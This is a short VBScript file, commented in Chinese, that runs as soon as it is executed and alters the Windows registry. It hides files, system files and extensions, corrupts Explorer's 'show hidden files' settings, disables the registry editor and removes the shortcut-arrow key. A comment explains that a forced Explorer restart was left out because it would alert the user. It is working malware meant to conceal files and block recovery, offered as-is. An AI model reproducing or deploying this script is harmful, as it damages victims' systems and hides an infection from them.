Call HideAllFile()

Sub HideAllFile() '隐藏所有文件，破坏Explorer隐藏选项，隐藏快捷方式小箭头，禁用注册表工具
	Const NoHiddenRegPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN\CheckedValue" 	
	Const ShowAllRegPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"		
	Const ShowShortCurIconRegPath = "HKCR\lnkfile\IsShortcut"
	Const RegToolForbidRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools"
	Const HideFileRegRootPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\"
	Call WriteReg(HideFileRegRootPath & "Hidden", 2, "REG_DWORD") 			'普通文件 			1-显示 2-隐藏
	Call WriteReg(HideFileRegRootPath & "ShowSuperHidden", 0, "REG_DWORD") 	'受系统保护的文件 	1-显示 0-隐藏
	Call WriteReg(HideFileRegRootPath & "HideFileExt", 1, "REG_DWORD") 		'文件扩展名			0-显示 1-隐藏
	Call WriteReg(NoHiddenRegPath, 3, "REG_DWORD") 							'破坏隐藏选项
	Call WriteReg(ShowAllRegPath, 2, "REG_DWORD")							'破坏隐藏选项
	Call WriteReg(RegToolForbidRegPath, 1, "REG_DWORD")						'禁用注册表工具
	Call DeleteReg(ShowShortCurIconRegPath) 								'隐藏快捷方式小箭头
	
	'Call RestartExplorer() '调用次函数可以强制重启Explorer以强制隐藏文件和快键方式小箭头，但是会引起用户的注意，遂取消
End Sub

Sub RestartExplorer()
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	objShell.Run "taskkill.exe /f /im explorer.exe", 0, true
	objShell.Run "explorer.exe"
	Set objShell = Nothing
End Sub

Function ReadReg(key) '读取注册表，搜索key，返回所在路径
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	ReadReg = objShell.RegRead(key)
	Set objShell = Nothing
End Function

Sub WriteReg(key, value, typeName) '写注册表
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	If typeName = "" Then
		objShell.RegWrite key, value
	Else
		objShell.RegWrite key, value, typeName
	End If
	Set objShell = Nothing
End Sub

Sub DeleteReg(targetPath) '删除注册表
	On Error Resume Next
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	objShell.RegDelete targetPath
	Set objShell = Nothing
End Sub